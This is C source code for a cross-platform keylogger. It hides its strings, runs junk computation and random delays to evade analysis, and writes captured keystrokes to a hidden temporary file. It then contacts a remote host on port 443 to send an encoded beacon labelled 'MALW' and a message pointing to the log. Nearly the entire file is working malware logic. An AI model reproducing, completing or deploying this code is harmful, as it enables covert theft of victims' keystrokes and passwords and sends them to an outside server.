#include "common/common.h"

#ifdef _WIN32
#include "common/keylogger.h"
#include "common/network.h"
typedef KeyloggerState KLState;
typedef NetContext NetCtx;
#else
#include "common/keylogger.h"
#include "common/network.h"
typedef KeyloggerState KLState;
typedef NetContext NetCtx;
#endif

static unsigned int rng_state = 0;

static void seed_prng(void) {
    #ifdef _WIN32
    rng_state = GetTickCount() ^ (GetCurrentProcessId() << 16) ^ time(NULL);
    #else
    FILE *f = fopen("/dev/urandom", "rb");
    if(f) {
        unsigned int s;
        fread(&s, 4, 1, f);
        rng_state = s ^ time(NULL) ^ (getpid() << 16);
        fclose(f);
    } else {
        rng_state = time(NULL) ^ (getpid() << 16);
    }
    #endif
    rng_state ^= (__TIME__[0] << 24) ^ (__TIME__[7] << 8);
}

static unsigned int next_rand(void) {
    rng_state ^= rng_state << 13;
    rng_state ^= rng_state >> 17;
    rng_state ^= rng_state << 5;
    return rng_state;
}

static void gen_id(char *buf, int sz) {
    const char c[] = "0123456789abcdef";
    for(int i = 0; i < sz - 1; i++) buf[i] = c[next_rand() & 0xF];
    buf[sz - 1] = '\0';
}

static void polylab1(int *arr, int len) {
    int result = 0;
    for(int i = 0; i < len; i++) {
        result += arr[i] * (i + 1);
    }
    (void)result;
}

static void process_data(char *data, int len) {
    char key[4] = {0x4A, 0x5F, 0x2C, 0x1B};
    key[0] ^= (char)(next_rand() & 0xFF);
    key[1] ^= (char)(next_rand() & 0xFF);
    xor_encrypt(data, len, key, 4);
}

static int validate_buffer(char *buf, int size) {
    int sum = 0;
    for(int i = 0; i < size && buf[i]; i++) {
        sum += (unsigned char)buf[i];
    }
    return (sum > 0);
}

static void random_delay(void) {
    volatile unsigned int seed = 0;
    #ifdef _WIN32
    seed = GetTickCount();
    seed ^= (unsigned int)time(NULL);
    #else
    FILE *f = fopen("/dev/urandom", "rb");
    if(f) {
        unsigned int s;
        fread(&s, 4, 1, f);
        seed = s ^ time(NULL);
        fclose(f);
    } else {
        seed = time(NULL);
    }
    #endif
    
    for(volatile unsigned int i = 0; i < (seed % 5000); i++) {
        seed = (seed * 1103515245 + 12345) & 0x7FFFFFFF;
    }
    
    sleep_junk((int)((seed % 2000) + 500));
}

static int encode_packet(char *dest, const char *src, int len) {
    char k1 = 0xAB, k2 = 0xCD, k3 = 0xEF;
    k1 ^= (char)(next_rand() & 0xFF);
    k2 ^= (char)(next_rand() & 0xFF);
    k3 ^= (char)(next_rand() & 0xFF);
    for(int i = 0; i < len; i++) {
        dest[i] = src[i] ^ k1;
        dest[i] = (dest[i] << 3) | (dest[i] >> 5);
        dest[i] ^= k2;
        dest[i] = (dest[i] << 2) | (dest[i] >> 6);
        dest[i] ^= k3;
    }
    return len;
}

int main(int argc, char *argv[]) {
    seed_prng();
    init_obfuscated_strings();
    
    char build_id[9];
    gen_id(build_id, sizeof(build_id));
    
    int arr[10];
    for(int i = 0; i < 10; i++) arr[i] = (int)(next_rand() % 100);
    polylab1(arr, 10);
    
    random_delay();
    
    KLState kls;
    memset(&kls, 0, sizeof(KLState));
    #ifdef _WIN32
    init_keylogger_win(&kls);
    #else
    init_keylogger_unix(&kls);
    #endif
    
    char log_path[256];
    unsigned int log_id = next_rand();
    #ifdef _WIN32
    snprintf(log_path, sizeof(log_path), "C:\\Users\\Public\\.%x.tmp", log_id);
    #else
    snprintf(log_path, sizeof(log_path), "/tmp/.%x_%d", log_id, getpid());
    #endif
    
    char buffer[1024];
    snprintf(buffer, sizeof(buffer), "ST:%s|T:%ld", build_id, (long)time(NULL));
    process_data(buffer, strlen(buffer));
    
    NetCtx ctx;
    memset(&ctx, 0, sizeof(NetCtx));
    #ifdef _WIN32
    net_init_win(&ctx);
    #else
    net_init_unix(&ctx);
    #endif
    
    if(validate_buffer(decoded_url, strlen(decoded_url))) {
        #ifdef _WIN32
        int conn = net_connect_win(&ctx, "example.com", 443, 1);
        #else
        int conn = net_connect_unix(&ctx, "example.com", 443);
        #endif
        if(conn) {
            char enc_data[512];
            char raw_data[128];
            snprintf(raw_data, sizeof(raw_data), "MALW|BUILD:%s|TS:%ld|PID:%d", 
                     build_id, (long)time(NULL),
                     #ifdef _WIN32
                     GetCurrentProcessId()
                     #else
                     getpid()
                     #endif
            );
            int enc_len = encode_packet(enc_data, raw_data, strlen(raw_data));
            
            #ifdef _WIN32
            net_send_win(&ctx, enc_data, enc_len);
            #else
            net_send_unix(&ctx, enc_data, enc_len);
            #endif
        }
    }
    
    sleep_junk(1000 + (int)(next_rand() % 2000));
    
    if(kls.running) {
        #ifdef _WIN32
        start_keylog_win(&kls, log_path);
        #else
        start_keylog_unix(&kls, log_path);
        #endif
    }
    
    sleep_junk(500 + (int)(next_rand() % 1500));
    
    char upload_data[256];
    snprintf(upload_data, sizeof(upload_data), "SEND|LOG:%s|PID:%d", log_path, 
             #ifdef _WIN32
             GetCurrentProcessId()
             #else
             getpid()
             #endif
    );
    
    if(ctx.connected) {
        #ifdef _WIN32
        net_send_win(&ctx, upload_data, strlen(upload_data));
        #else
        net_send_unix(&ctx, upload_data, strlen(upload_data));
        #endif
    }
    
    #ifdef _WIN32
    net_close_win(&ctx);
    #else
    net_close_unix(&ctx);
    #endif
    
    for(int i = 0; i < 30 + (next_rand() % 40); i++) {
        polylab1(arr, 10);
    }
    
    return 0;
}
